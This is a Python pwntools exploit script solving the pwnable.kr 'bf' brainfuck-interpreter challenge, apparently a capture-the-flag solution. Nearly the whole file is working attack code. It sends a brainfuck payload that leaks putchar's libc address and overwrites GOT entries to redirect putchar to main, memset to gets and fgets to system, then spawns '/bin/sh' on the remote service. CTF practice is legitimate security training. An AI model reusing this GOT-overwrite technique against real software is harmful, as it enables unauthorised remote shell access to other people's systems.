#coding=utf-8
from pwn import *

context.binary = './bf'
bf = ELF('./bf')
fgets = 0x8048734
debug = 1
if debug:
    libc = ELF('/lib32/libc-2.27.so')
    r = process('./bf')
else:
    libc = ELF('./bf_libc.so')
    r = remote('pwnable.kr', 9001)
putchar_system = libc.symbols['putchar'] - libc.symbols['system']
putchar_gets = libc.symbols['putchar'] - libc.symbols['gets']

tape = 0x0804A0A0
fgets = 0x0804a010 
puts = 0x0804A018
memset = 0x0804a02c
putchar = 0x0804A030
main = 0x08048671

# print putchar@plt addr
payload = '<' * (tape - putchar) + '.' + '.>' * 4 + '<' * 4

# overwrite putchar@got to main
payload += ',>' * 4 + '<' * 4 

# overwrite memset@got to gets
payload += '<' * (putchar - memset) + ',>' * 4 + '<' * 4

# overwrite fgets@got to system
payload += '<' * (memset- fgets) + ',>' * 4 + '.'
print payload

r.recvuntil('[ ]')
r.sendline(payload)

# 為啥這裡有垃圾?
print r.recv(1).encode('hex')
print r.recv(1).encode('hex')
putchar_plt = u32(r.recv(4))

r.send(p32(main))
r.send(p32(putchar_plt - putchar_gets))
r.send(p32(putchar_plt - putchar_system))

r.sendline('/bin/sh')
r.interactive()
